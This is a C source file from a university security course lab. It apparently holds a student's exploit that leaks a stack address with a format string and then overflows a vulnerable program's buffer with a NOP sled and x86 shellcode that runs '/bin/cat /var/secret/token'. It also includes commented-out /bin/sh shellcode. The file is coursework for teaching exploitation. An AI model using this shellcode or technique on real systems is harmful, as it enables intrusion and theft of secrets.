/*
 * CMSC 414, Spring 2024
 * Project 1 | task1
 *
 * Build instructions:
 *   We will be building this with the Makefile provided; you may not make
 *   any changes to the Makefile.  You can #include any other standard C
 *   libraries you want in this file, but none that require any compiler
 *   flags that aren't already in the Makefile.
 *
 */

#include <unistd.h>
#include <stdio.h>  // for fwrite()
#include <string.h> // for memset()
#include <stdlib.h> // for EXIT_SUCCESS
#include <stdint.h> // useful

#include "comms.h"  // for communicating with vulnerable

// Note the bigger buffer this time
#define BUFFER_SIZE 512

/* We are providing you with shell code */

// The following shellcode would launch a shell. 
// Play with it! But it's not what we are using in this project
/*
char shellcode[]=
    "\x31\xc0"             // xorl    %eax,%eax
    "\x50"                 // pushl   %eax
    "\x68""//sh"           // pushl   $0x68732f2f
    "\x68""/bin"           // pushl   $0x6e69622f
    "\x89\xe3"             // movl    %esp,%ebx
    "\x50"                 // pushl   %eax
    "\x53"                 // pushl   %ebx
    "\x89\xe1"             // movl    %esp,%ecx
    "\x99"                 // cdql
    "\xb0\x0b"             // movb    $0x0b,%al
    "\xcd\x80"             // int     $0x80
    ;
*/

// Instead, we will be using this "shellcode"; rather than actually open a
// shell, it executes the command '/bin/cat /var/secret/token'
char shellcode[] =
    "\x31\xc0"         // xor    %eax, %eax
    "\x99"             // cltd
    "\x52"             // push   %edx
    "\x68""/cat"       // push   $0x7461632f
    "\x68""/bin"       // push   $0x6e69622f
    "\x89\xe3"         // mov    %esp, %ebx
    "\x52"             // push   %edx
    "\x68""oken"       // push   oken (reversed)
    "\x68""///t"       // push   ///t (reversed) 
    "\x68""ret/"       // push   ret/ (reversed)
    "\x68""/sec"       // push   /sec (reversed)
    "\x68""/var"       // push   /var (reversed)
    "\x89\xe1"         // mov    %esp, %ecx
    "\xb0\x0b"         // mov    $0xb, %al
    "\x52"             // push   %edx
    "\x51"             // push   %ecx
    "\x53"             // push   %ebx
    "\x89\xe1"         // mov    %esp, %ecx
    "\xcd\x80"         // int    $0x80
    ;

int main()
{

    char buffer[BUFFER_SIZE];
    memset(buffer, 0, BUFFER_SIZE);  // Initialized to all zeroes

    /* TODO: You may change this string */
    char greeting[128] = "%d %d %d";

    /* Send our greeting to the vulnerable program and get the response */
    char response[512];
    ssize_t resplen;
    resplen = sendto_and_recvfrom_vulnerable(
		    greeting, sizeof(greeting)-1,   /* sent to vulnerable */
		    response, sizeof(response));    /* received from vulnerable */

    /* TODO: Populate the buffer here. Use the 'response' as you see fit */
    char* ptr = &response[22];
    int bob = atoi(ptr);
    memset(buffer, '\x90', BUFFER_SIZE); 
    memcpy(&buffer[72], &bob, 4);
    memcpy(&buffer[76], &bob, 4);
    memcpy(&buffer[448], &shellcode, sizeof(shellcode));
    
    /* Send the buffer (expect no response) */
    sendto_vulnerable(buffer, sizeof(buffer));

    return EXIT_SUCCESS;
}
